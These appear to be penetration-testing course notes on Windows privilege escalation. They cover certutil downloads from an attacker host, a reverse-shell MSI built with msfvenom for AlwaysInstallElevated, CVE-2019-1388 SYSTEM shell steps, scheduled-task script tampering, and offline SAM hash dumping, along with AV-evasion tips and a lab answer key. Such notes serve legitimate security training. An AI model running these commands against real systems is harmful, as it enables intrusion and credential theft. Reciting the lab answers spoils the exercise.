# NOTE — Miscellaneous Techniques

## ID
2700

## Module
Windows Privilege Escalation

## Kind
notes

## Title
Section 27 — Miscellaneous Techniques

## Description
Covers a collection of additional privesc vectors: LOLBAS binaries for evasion and file transfers, AlwaysInstallElevated MSI exploitation for SYSTEM shells, CVE-2019-1388 UAC certificate dialog bypass, scheduled task abuse, credential hunting in user/computer description fields, and mounting VHDX/VMDK backups to extract SAM hashes offline.

## Tags
lolbas, alwaysinstallelevated, cve-2019-1388, scheduled-tasks, vhdx, credential-hunting

## Commands
- `certutil.exe -urlcache -split -f http://<ATTACKER_IP>:8080/<FILE> <FILE>`
- `certutil -encode <INPUT_FILE> <ENCODED_FILE>`
- `certutil -decode <ENCODED_FILE> <OUTPUT_FILE>`
- `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
- `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
- `msfvenom -p windows/shell_reverse_tcp lhost=<ATTACKER_IP> lport=<PORT> -f msi > aie.msi`
- `msiexec /i <PATH_TO_MSI> /quiet /qn /norestart`
- `schtasks /query /fo LIST /v`
- `Get-LocalUser`
- `guestmount -a <VMDK_FILE> -i --ro /mnt/vmdk`

## What This Section Covers
This section is a catch-all for privesc techniques that don't fit into other categories. It covers Living Off The Land Binaries (LOLBAS) for file transfers and evasion, exploiting the AlwaysInstallElevated Group Policy misconfiguration to get SYSTEM via a malicious MSI, the CVE-2019-1388 UAC certificate dialog vulnerability for launching a SYSTEM browser, abusing writable scheduled task scripts, hunting credentials in user and computer description fields, and mounting virtual hard disk backups (VHDX/VMDK) to extract SAM/SYSTEM hives offline.

## Methodology

### LOLBAS (Living Off The Land Binaries and Scripts)
1. The [LOLBAS project](https://lolbas-project.github.io/) documents Microsoft-signed binaries with unexpected attacker-useful functionality: code execution, file transfers, persistence, UAC bypass, credential theft, DLL hijacking, and more.
2. Classic example — `certutil.exe`: intended for certificate handling, but doubles as a file transfer tool (`-urlcache -split -f`) and base64 encoder/decoder (`-encode` / `-decode`).
3. `rundll32.exe` can execute DLL files, including reverse shell payloads hosted on SMB shares.
4. Become familiar with as many LOLBAS entries as possible — they're essential for evasive assessments and restricted environments where you can only use native Windows tools.

### AlwaysInstallElevated
1. Check both registry keys — **both must be set to `0x1`** for the vulnerability to be exploitable:
   - `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
   - `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
2. Generate a malicious MSI with msfvenom: `msfvenom -p windows/shell_reverse_tcp lhost=<IP> lport=<PORT> -f msi > aie.msi`
3. Upload the MSI to the target, start a netcat listener, and execute: `msiexec /i c:\path\to\aie.msi /quiet /qn /norestart`
4. Catch the reverse shell as `NT AUTHORITY\SYSTEM`.
5. **Mitigation**: Disable "Always install with elevated privileges" in both Computer Configuration and User Configuration under `Administrative Templates\Windows Components\Windows Installer`.

### CVE-2019-1388 (Windows Certificate Dialog Privesc)
1. Requires GUI access and an executable signed with a certificate containing the `SpcSpAgencyInfo` OID (`1.3.6.1.4.1.311.2.1.10`) — the classic binary is `hhupd.exe`.
2. Right-click `hhupd.exe` → **Run as administrator** → enter admin creds at UAC prompt → click **Show information about the publisher's certificate**.
3. In the certificate General tab, the **Issued by** field renders as a hyperlink. Click it → click OK → a browser launches **as SYSTEM**.
4. Verify in Task Manager that the browser process runs under SYSTEM.
5. Right-click on the page → **View page source** → in the new tab, right-click → **Save as** → in the Save As dialog, type `c:\windows\system32\cmd.exe` in the file path and press Enter.
6. A `cmd.exe` shell opens as `NT AUTHORITY\SYSTEM`.
7. Patched November 2019, but unpatched systems still exist.

### Scheduled Tasks
1. Enumerate with `schtasks /query /fo LIST /v` or `Get-ScheduledTask | select TaskName,State`.
2. By default, you can only see your own tasks and default OS tasks. Admin-created tasks are stored in `C:\Windows\System32\Tasks` (normally unreadable by standard users).
3. Look for writable script directories (e.g., `C:\Scripts`) with `accesschk64.exe /accepteula -s -d C:\Scripts\`. If `BUILTIN\Users` has RW access, you can append code to scripts that run as SYSTEM.
4. This is an iterative process — you may discover writable script directories later in an engagement that you missed initially.

### User/Computer Description Field
1. Run `Get-LocalUser` — inspect the **Description** column for passwords or hints left by admins (e.g., "Network scanner - do not change password: !QAZXSW@3edc").
2. Check the computer description: `Get-WmiObject -Class Win32_OperatingSystem | select Description`.
3. In Active Directory: `Get-ADUser -Filter * -Properties Description | Where-Object {$_.Description -ne $null}`.

### Mounting VHDX/VMDK Backups
1. Hunt for `.vhd`, `.vhdx`, and `.vmdk` files on network shares using tools like **Snaffler** — these are virtual hard disk backups.
2. Mount on Linux:
   - VMDK: `guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk`
   - VHD/VHDX: `guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1`
3. On Windows: right-click → Mount, or use Disk Management, or `Mount-VHD` PowerShell cmdlet. For VMDK, use "Map Virtual Disk" or add as additional VM hard drive. 7-Zip can also extract VMDK contents.
4. Navigate to `C:\Windows\System32\Config` and pull SAM, SECURITY, and SYSTEM hives.
5. Dump hashes: `secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL`

## Lab — Questions & Answers (optional)
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: Find cleartext password for an account on the target host | !QAZXSW@3edc | `Get-LocalUser` revealed password in `secsvc` account's Description field: "Network scanner - do not change password: !QAZXSW@3edc" |

## Key Takeaways
- **LOLBAS is essential knowledge** — `certutil`, `rundll32`, `mshta`, `regsvr32`, `bitsadmin`, and dozens of other signed Microsoft binaries can perform attacker-useful actions while blending in with normal system activity. Bookmark the [LOLBAS project](https://lolbas-project.github.io/).
- **AlwaysInstallElevated** is a direct path to SYSTEM and requires both HKCU and HKLM keys set to `0x1`. PowerUp detects this automatically. It appeared in the Citrix Breakout section (Section 24) too — `Write-UserAddMSI` exploits the same misconfiguration.
- **CVE-2019-1388** requires GUI access and only works on unpatched pre-November 2019 systems, but it's a clean SYSTEM shell with no tools needed beyond a signed binary and a browser. Always check for it on older hosts.
- Scheduled task abuse is a **patience play** — you may need to append code and wait hours or days for the task to run. It's especially effective on long-duration engagements.
- **Always check user descriptions** — `Get-LocalUser` takes seconds and catches lazy admin documentation. Same principle applies to AD user objects and computer description fields.
- Virtual hard disk files on network shares are goldmines — they let you extract SAM hashes offline without needing admin access on the live target. Look for backup shares with Snaffler.
- `secretsdump.py` with `-sam`, `-security`, and `-system` works entirely offline against extracted hive files — you don't need network access to the target.

## Gotchas
- `certutil` file downloads may be flagged by AV/EDR — consider base64 encoding the file first, transferring the encoded version, and decoding on target.
- CVE-2019-1388 steps were demonstrated with Chrome — the exact right-click menu options may differ slightly in other browsers (Firefox, Edge).
- For AlwaysInstallElevated, the MSI executes silently with `/quiet /qn /norestart` flags — without these, a GUI dialog may appear and tip off the user.
- When mounting VHDX/VMDK on Linux, the `guestmount` command requires `libguestfs-tools` installed. Mount read-only (`--ro`) to avoid modifying evidence.
- Standard users **cannot** list admin-created scheduled tasks by default. The technique relies on finding writable script directories that those tasks reference — it's a combination of misconfigurations, not a single vulnerability.
- Snaffler is noisy on the network — it scans all accessible shares. Use it judiciously and be aware of detection risk during evasive assessments.
